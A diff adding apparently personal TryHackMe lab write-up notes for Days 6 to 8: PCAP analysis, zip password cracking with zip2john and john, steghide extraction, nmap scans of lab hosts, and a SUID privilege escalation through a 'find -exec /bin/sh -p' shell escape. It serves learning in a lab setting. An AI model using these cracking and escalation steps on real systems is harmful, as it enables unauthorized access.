@@ -113,3 +113,70 @@ OSINT
 
 Given an image use OSINT techniques to answer the questions.  Answers started with using exiftool to grab a username.  Search for that username on google to find social media.  Inside social media were links to other items of interest.  Also used Wayback Machine
 
+# Task 11 - Day 6
+Another PCAP is provided for analysis
+
+* Question 1 - what was exfiltrated in DNS
+    * set wireshark filter to dns
+    * load CyberChef and paste finding
+    * use Magic recipe
+* Question 2 - Timmy's christmas
+    * download the zip file from the PCAP
+    * use zip2john to create a hash of the zip file
+        ```
+        zip2john christmaslists.zip > zip.hash
+        ```
+    * use john to crack the hash and then extract the contents
+        ```
+        john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+        ```
+* Question 3 - hidden contents
+    * download the JPG from the PCAP
+    * use steghide to extract the hidden file
+        ```
+        steghide extract -sf TryHackMe.jpg
+        ```
+
+# Task 12 - Day 7
+Enumerate the machine
+* Question 1 - how many TCP ports under 1000 are open
+    ```
+    nmap -A -T4 10.10.93.9 -p 1-999 | tee nmap.txt
+    ```
+* Question 2 - what is the name of the OS on the host
+    ```
+    guess based on services running
+    ```
+* Question 3 - what version of SSH is running
+    ```
+    view nmap results
+    ```
+* Question 4 - location of hidden file
+    * browse to main site, file is listed
+
+# Task 13 - Day 8
+SUID exploits
+* Question 1 - find SSH port
+    * run nmap
+        ```
+        nmap -A -T4 10.10.114.197 -p- | tee nmap.txt 
+        ```
+* Question 2 - search for files with SUID bit
+    * search for files with SUID set
+        ```
+        find / -perm -u=s -type f 2>/dev/null
+        ```
+    * research findings against GTFOBins
+    * notice one that stands out and run it
+        ```
+        holly@ip-10-10-114-197:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
+        $ whoami
+        igor
+        $ cat /home/igor/flag1.txt
+        ```
+* Question 3 - find another file with SUID set and get root
+    * review findings again
+    * execute one of the files that looks different
+        ```
+        /usr/bin/system-control
+        ```
